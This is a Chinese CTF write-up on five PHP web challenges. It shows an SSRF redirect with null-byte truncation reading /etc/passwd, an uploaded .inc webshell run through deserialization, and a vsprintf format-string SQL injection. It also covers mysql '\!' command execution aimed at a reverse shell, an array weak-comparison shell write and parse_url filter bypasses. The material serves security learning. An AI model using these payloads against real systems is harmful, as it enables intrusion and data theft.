@@ -1,0 +1,282 @@
+一、 前记
+最近打了一些比赛，收获了不少知识，简单在这里罗列一下要分享的东西:
+1. 一道SSRF结合spl_autoload_register()特性，反序列化命令执行的题目。
+2. 一道最新的wordpress格式化字符串漏洞导致的二次注入的题目。
+3. 一道有关Mysql指令妙用的题目。
+4. 关于数组弱比较导致绕过危险过滤，成功写入shell的一则记录。
+5. parse_url()有关特性的小trick。
+二、 题目一：重定向与反序列化
+题目来自2017湖湘杯复赛web400，感觉质量比较高：
+(注：研究出来的时候题目已经关了，自己本地尝试的，所有没有css和js很丑，这个其实不重要）
+最开始拿到题目：http://118.190.113.111:10080/index.php?act=user的时候挺没有头绪的
+一开始以为是ssrf摸内网，又发现好像有上传，各种尝试302打进去探测端口，发现都挺奇怪的，一直没get到考点
+后来发现有一个redirect.php，会重定向
+于是在photo url处尝试了一下
+http://118.190.113.111:10080/redirect.php?redirect=file:///etc/passwd
+但是这里会被waf拦下，只允许通过.jpg和.png的结尾，于是尝试00截断
+如下:
+发现可以成功读取到内容
+于是拿下源码进行分析（以下为本地测试，vps就打码了，毕竟是队友的）
+在login.php里
+如果是本地访问的话,token才会为1
+在common.php中
+可以发现debug的值为1会返回http头数据
+于是猜想利用redirect.php请问，伪造本地登录
+http://118.190.113.111:10080/redirect.php?redirect=login.php?username=1&password=1.jpg
+这样是不是就可以达到本地登录的目的了呢？
+（注：这里有个小坑，需要2次url编码，所以payload如下）
+注意到源码中debug为1的时候会返回http头数据，跟进$result去处
+可见http头被写入了图片中，于是我们去访问刚才生成的图片
+可以看到我们需要的http头数据，里面就有我们需要的phpsession
+将自己的phpsessionid改成这个
+可见我们已经用haozi登录成功了
+看upload.php
+发现过滤并没有过滤.inc，并且token为1才可以上传
+而我们注意到
+这里的spl_autoload_register();
+我们测试一下
+发现是可以解析.inc的
+于是想到上次一个.inc文件
+自己写了一个上传
+再写了一个ls.inc
+<?php
+system('ls');
+?>
+于是上传
+发现上传成功
+注：记得改一下Content-Type否则过不了waf
+此时利用
+我们可以构造序列化
+然后利用include参数包含路径
+于是综合payload如下:
+命令执行成功。
+总结一下:
+1.利用重定向+00截断读源码
+2.利用重定向+debug获得本地登录的phpsessionid
+3.上传.inc结尾的恶意文件
+4.利用spl_autoload_register()的文件包含+cookie反序列化执行命令
+三、 题目二：二次注入与格式化字符串
+题目来自安恒12月月赛的一道web500审计题，利用wordpress最新的漏洞：格式化字符串注入，并将其改编成了一道二次注入的题目，感觉质量不错
+源码分析
+拿到题目先分析了下结构
+应该是一个mvc的架构
+include/action里的是控制器
+include/lib里是用到的类库
+include/view里是前端界面
+我们直接看include/action/register.php
+流程如下：
+首先是获取参数做基本处理：
+然后对我们的输入进行限制
+对于长度限制，我们暂时不用考虑，50字符的长度还是很容易绕过的。
+接着看到下面会检测有没有重复用户名
+如果没有会进行添加用户
+我们跟进这里的add()函数
+这里会对我们的输入的把我们输入的$username, $email, $hash, $time和
+一起传入z_db_prepare()
+于是我们跟进这个函数
+看到这个函数的描述，当时我就感叹了，这就是之前不久爆出的wordpress格式化字符串注入新漏洞
+攻击流程分析
+于是注册的时候我们构造如下，
+$username = "%1$%s or 1=1#";
+$password = "1234";
+$email = "test@test";
+然后传入z_db_prepare()中
+先看$query的变化:
+经过
+处理,所有的%s变成'%s'
+于是
+变成
+INSERT INTO z_users(`username`,`email`,`password`,`time`) VALUES('%s', '%s', '%s', '%s')
+然后再看$args传入后的变化
+首先经过 $args = func_get_args(); 变成: array(5) { [0]=> string(80) "INSERT INTO z_users(`username`,`email`,`password`,`time`) VALUES(%s, %s, %s, %s)" [1]=> string(13) "%1$%s or 1=1#" [2]=> string(9) "test@test" [3]=> string(32) "81dc9bdb52d04dc20036dbd8313ed055" [4]=> string(19) "2017-12-19 13:52:34" } 又经过array_shift( $args );变成 array(4) { [0]=> string(13) "%1$%s or 1=1#" [1]=> string(9) "test@test" [2]=> string(32) "81dc9bdb52d04dc20036dbd8313ed055" [3]=> string(19) "2017-12-19 13:52:44" } 然后经过 array_walk( $args, 'myaddslashes'); 变成 ``` array(4) { [0]=> string(13) "%1$%s or 1=1#" [1]=> string(9) "test@test" [2]=> string(32) "81dc9bdb52d04dc20036dbd8313ed055" [3]=> string(19) "2017-12-19 13:52:57" } 最后经过 @vsprintf( $query, $args ); 将$query格式化为: INSERT INTO z_users(`username`,`email`,`password`,`time`) VALUES('%1$%s or 1=1#', 'test@test', '81dc9bdb52d04dc20036dbd8313ed055', '2017-12-19 13:53:07') 然后返回到add函数中
+可以看见直接执行了我们的sql
+INSERT INTO z_users(`username`,`email`,`password`,`time`) VALUES('%1$%s or 1=1#', 'test@test',
+'81dc9bdb52d04dc20036dbd8313ed055', '2017-12-19 13:53:07')
+然后我们用户名为`%1$%s or 1=1#`的账户就被成功插入
+下一步我们可以登录了
+会来到index.php
+然后发现了关键触发点
+我们在此可以传入我们的用户名作为$_GET['author']
+即
+author = %1$%s or 1=1#
+于是我们跟进函数getUserArticles()
+这里会先判断getDetailUsr()，看用户是否存在
+显然我们注册过用户，所以可以轻松绕过这一点
+这也是我们必须在注册的时候就引入格式化字符串注入的地方
+然后我们的username会被
+利用
+这里我就不一步一步写出过程了
+可以直接得到结果:
+$additional = and `username`= '%1$%s or 1=1#'
+然后传入
+此时的$query为
+SELECT * FROM z_articles where `status`=%d and `username`= '%1$%s or 1=1#
+而
+故$status=1
+然后重点来了！！！！
+$query经过
+处理%s变成了'%s'
+得到：
+SELECT * FROM z_articles where `status`=%d and `username`= '%1$'%s' or 1=1#
+然后最后的$args经过一系列处理变成了
+array(1) {
+[0]=>
+string(1) "1"
+}
+然后来到了最后
+@vsprintf( $query, $args );
+经过格式化字符串后，你会惊奇的发现
+SELECT * FROM z_articles where `status`=1 and `username`= '1' or 1=1#
+单引号成功逃逸了！
+那么这是为什么呢？
+原因在此:
+我们来看一下vsprintf()的一个小特性
+vsprintf('%s, %d, %s', ["a", 1, "b"]); // "a, 1, b"
+vsprintf('%s, %d, %1$s', ["a", 1, "b"]); // "a, 1, a"
+可以发现%n$s不会读取下一个参数，而是读取第n个位置的参数
+所以我们最后的格式化字符串问题:
+echo vsprintf("%1$'%s'", ["1"]);
+结果:
+1'
+因为这里的%s被替换成了array[1]的值，即1
+但是问题来了
+%1$'%s'
+大家可以发现中间的'不见了，%1$'%s直接变成了数组第一个值了，按道理说不应该是'1'吗？怎么会是`1'呢
+原因如下:
+这里利用了vsprintf()的padding功能：
+单引号后的一个字符会作为padding填充字符串
+官方手册里是这样解释的:
+单引号
+（规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%'x20s（使用 "x" 作为填充））
+实例：
+<?php
+$str1 = "Hello";
+echo sprintf("[%'*8s]",$str1);
+?>
+输出
+[***Hello]
+为什么是这样的输出?
+因为要长度为8的字符串，不够的用单引号后的*进行填充
+所以又3个*
+那么我们题中的是
+%1$'%s
+可以看到
+'%s
+这里不存在长度要求，所以不存在填充，直接就可以把单引号吃掉导致了后一个'的逃逸
+最后就可以尽情的注入拿去flag了
+四、 题目三：有趣的mysql指令
+这个的学习来自于最近的pwnhub公开赛：成功就是要梭哈
+我将结合这个案例来说明一下Mysql指令的妙用
+（1）题目
+代码如下:
+<?php highlight_file('index.txt'); $url = "https://sqlchop.chaitin.cn/demo/detect/"; $sqlque = 'select 1 from dual where 1='; if(isset($_GET['a'])) $payload = str_replace(';','',(string)$_GET['a']); else $payload = '1'; $postd = array('type'=>'body','content_type'=>'application/x-www-form-urlencoded','payload'=>urlencode($payload)); $post_data = json_encode($postd); $ch = curl_init($url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Content-Type: application/json', 'Content-Length: ' . strlen($post_data)) ); $result = curl_exec($ch); $arr = json_decode($result,true); if(!array_key_exists('attack',$arr)||$arr['attack']>0) die('error!'); if(preg_match('/from|@|information_schema|\./is',$payload)) die('hacker?'); $sql = "mysql -u****** -p****** -e ".escapeshellarg($sqlque.$payload); exec($sql,$aa); var_dump($aa); ?>
+（2）源码分析
+题目大体原理如下：
+1.我们传入点在$a变量
+2.传入值后，会被过滤;
+3.然后被json编码传入https://sqlchop.chaitin.cn/demo/detect/进行检测
+4.将检测结果传回来，再进行json解码
+5.如果解码后发现attack不存在（因为不可能不存在，无危险是0，不存在是伪造了），或者检测到attack>0，就直接die
+6.如果没有检测到attack，则进一步过滤from,@,information_achema,.这些字符
+7.如果检测到上述危险字符则die
+8.如果没有检测到，则将payload与select 1 from dual where 1=进行拼接，然后执行命令
+9.然后打印出命令执行的结果
+（3）攻击方式
+（3.1）前引知识
+这里用到的知识点是Mysql的相关命令
+如下
+：
+这里我们这次比赛用到的几个点：
+clear (\c) Clear the current input statement.
+delimiter (\d) Set statement delimiter.
+use (\u) Use another database. Takes database name as argument.
+nopager (
+) Disable pager, print to stdout.
+system (\!) Execute a system shell command.
+这里简单说一下:
+\c：清除之前的sql语句 （用来清除之前没用的sql语句影响）
+\d：指定sql分割符号（用来绕过;过滤）
+：关闭页面设置，可以在任何位置，例如sel
+ect（用来绕过关键词过滤）
+\u：可以指定一个数据库 （用来查表）
+\!：可以执行linux bash命令 （用来执行命令）
+(3.2) 用法之一：执行命令
+所以这里的第一步攻击就很明显了：
+a = \! ls -l
+即拼接后得到:
+mysql -u****** -p****** -e "\! ls -l"
+我们在linux下试试:
+没错，可以成功执行命令，于是乎利用这一点可以成功的进行反弹shell
+但是反弹shell里被过滤了.，应该怎么处理呢？
+这里我们选择用base64编码的方式绕过：
+如果我们将这里的ls -al换成其他反弹shell的命令，就可以成功绕过.的过滤，反弹shell
+（3.3）用法之二：查询数据库
+首先利用\c清除之前的sql语句，去除之前没用的干扰
+于是构造:
+\c show databases
+可以得到回显:
+故可以得到数据库的所有库名
+然后继续查询：
+利用指令：
+\c show tables \u web1
+从而指定库名为web1（因为是自己复现，所以随便挑了个库）
+最后查询表内信息：
+即可获取表内信息
+注意：题目里的from被过滤了，我们可以用fr
+om来绕过
+（
+可以用来绕过一些过滤）
+五、 题目四：数组弱比较
+这个知识点的学习来自于ph牛的博客
+有这样一道源码审计：
+<?php function is_valid($title, $data) { $data = $title . $data; return preg_match('|\A[ _a-zA-Z0-9]+\z|is', $data); } function write_cache($title, $content) { if (!is_valid($title, $content)) { exit("title or content error"); } $filename = "1.php"; file_put_contents($filename, $content); } $title = $_GET['title']; $content = $_GET['content']; write_cache($title,$content);
+乍一看，过滤的比较严格，想要写入shell像这样<这样的符号肯定是通不过的，那么如何破解呢？
+主要问题还是在于
+function is_valid($title, $data) { $data = $title . $data; return preg_match('|\A[ _a-zA-Z0-9]+\z|is', $data); }
+验证函数的弱类型问题
+这里为了显示清楚，我加了两个var_dump()
+如果正常传入参数，显然是没有问题的
+http://localhost/web/trick1/index.php?title=sky&content=123
+但如果我们传入数组的话:
+http://localhost/web/trick1/index.php?title=sky&content[]=%3C?php%20phpinfo();
+可以清楚的看见由于数组的弱比较，数组在进行检验的时候变成了Array于是可以成功绕过检测，写入shell
+六、题目五：parse_url()
+技巧点一
+题目来自swpu2017
+代码如下
+<?php error_reporting(0); $_POST=Add_S($_POST); $_GET=Add_S($_GET); $_COOKIE=Add_S($_COOKIE); $_REQUEST=Add_S($_REQUEST); function Add_S($array){ foreach($array as $key=>$value){ if(!is_array($value)){ $check= preg_match('/regexp|like|and|\"|%|insert|update|delete|union|into|load_file|outfile|\/\*/i', $value); if($check) { exit("Stop hacking by using SQL injection!"); } }else{ $array[$key]=Add_S($array[$key]); } } return $array; } function check_url() { $url=parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); $key_word=array("select","from","for","like"); foreach($query as $key) { foreach($key_word as $value) { if(preg_match("/".$value."/",strtolower($key))) { die("Stop hacking by using SQL injection!"); } } } } ?>
+从源码中可知有一个check_url()函数会进行过滤
+但是他利用了这样的获取方式
+$url=parse_url($_SERVER['REQUEST_URI']);
+parse_str($url['query'],$query);
+而这就导致了我们的攻击点
+我们看以下测试：
+我们先正常输入：
+http://localhost/web/trick1/parse.php?sql=select
+可以看到，我们被正常的过滤
+但是如果这样：
+http://localhost///web/trick1/parse.php?sql=select
+我们就可以绕过过滤，导致注入成功
+因为这里用到了 parse_url 函数在解析 url 时存在的 bug，通过：///x.php?key=value 的方式可以使其返回 False。具体可以看下 parse_url() 的源码。
+这里麦香浓郁师傅已经在博客给出了分析：
+PHPAPI php_url *php_url_parse_ex(char const *str, size_t length) { char port_buf[6]; php_url *ret = ecalloc(1, sizeof(php_url)); char const *s, *e, *p, *pp, *ue; ...snip... } else if (*s == '/' && *(s + 1) == '/') { /* relative-scheme URL */ s += 2; } else { just_path: ue = s + length; goto nohost; } e = s + strcspn(s, "/?#"); ...snip... } else { p = e; } /* check if we have a valid host, if we don't reject the string as url */ if ((p-s) < 1) { if (ret->scheme) efree(ret->scheme); if (ret->user) efree(ret->user); if (ret->pass) efree(ret->pass); efree(ret); return NULL; }
+可以看到，在函数 parse_url 内部，如果 url 是以 // 开始，就认为它是相对 url，而后认为 url 的部件从 url+2 开始。line 281，若 p-s < 1 也就是如果 url 为 ///x.php，则 p = e = s = s + 2，函数将返回 NULL。
+再看 PHP_FUNCTION，line 351：
+/* {{{ proto mixed parse_url(string url, [int url_component]) Parse a URL and return its components */ PHP_FUNCTION(parse_url) { char *str; size_t str_len; php_url *resource; zend_long key = -1; if (zend_parse_parameters(ZEND_NUM_ARGS(), "s|l", &str, &str_len, &key) == FAILURE) { return; } resource = php_url_parse_ex(str, str_len); if (resource == NULL) { /* @todo Find a method to determine why php_url_parse_ex() failed */ RETURN_FALSE; }
+若 php_url_parse_ex 结果为 NULL，函数 parse_url 将返回 FALSE
+技巧点二
+题目来自2016asisctf
+源码如下：
+<?php $data = parse_url($_SERVER['REQUEST_URI']); var_dump($data); $filter=["cache", "binarycloud"]; foreach($filter as $f) { if(preg_match("/".$f."/i", $data['query'])) { die("Attack Detected"); } } ?>
+这里如果我们输入
+http://localhost/web/trick1/parse2.php?/home/binarycloud/
+就会被waf拦截
+但是如果输入
+http://localhost/web/trick1//parse2.php?/home/binarycloud/
+则会被当做相对url，
+此时的parse2.php?/home/binarycloud/都会被当做是data[‘path’]
+而不再是query
+但是需要注意的是：
+刚漏洞问题只存在于php5.4.7以前
+六、 后记
+Web的知识博大精深，希望能做到更多有关真实漏洞的题目，在实战中不断成长！如果文章中出现错误，也请各位大佬斧正！
